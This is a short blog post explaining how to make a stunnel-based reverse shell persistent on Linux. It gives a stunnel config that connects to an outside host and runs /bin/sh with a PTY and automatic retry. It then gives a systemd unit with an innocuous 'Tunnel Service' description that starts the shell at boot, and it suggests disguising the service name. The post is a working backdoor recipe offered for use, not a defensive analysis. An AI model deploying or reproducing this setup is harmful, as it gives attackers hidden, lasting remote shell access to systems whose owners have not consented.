---
layout: post
title: "Persistent Backdoors with Stunnel"
---

After reading [this advisory][checkmk-adv] from SonarSource about a remote code execution chain in checkmk, I was looking at checkmk for useful utilities, and noticed it ships with [stunnel][stunnel].

Previously, using stunnel for a reverse shell that automatically reconnects and gives a full TTY was documented [here][stunnel-rev]. I figured I'd spend a few minutes making this backdoor persistent using systemd.

Anyway, its pretty simple. The following snippets will show you the way.

First, you need to create a stunnel config file and put it somewhere on disk. I put mine in `/etc/stun.conf`.  
Obviously, replace the "connect" line with your listeners host/port. For listener setup, use socat and openssl as per the [other blog post][stunnel-rev].

{% highlight bash %}
output=/dev/null
pid=/tmp/.stun.pid
[service]
client=yes
connect=192.168.0.159:4443
verifyPeer = no
exec=/bin/sh
pty=yes
retry=yes
{% endhighlight %}

Next, you need your systemd service file. I put mine in `/lib/systemd/system/tunnel.service`, but you can name yours whatever.

{% highlight bash %}
[Unit]
Description=Tunnel Service

[Service]
Type=forking
ExecStop=/usr/bin/killall -9 stunnel
ExecStart=/usr/bin/stunnel /etc/stun.conf
{% endhighlight %}

Once you have these files installed, just enable the service with `systemctl enable tunnel`. Obviously, you may have to change the name if you disguised your service as something else.

[checkmk-adv]: https://blog.sonarsource.com/checkmk-rce-chain-1/
[stunnel]: https://www.stunnel.org/
[stunnel-rev]: https://darrenmartyn.ie/2020/09/01/reverse-ssl-shells-with-stunnel/
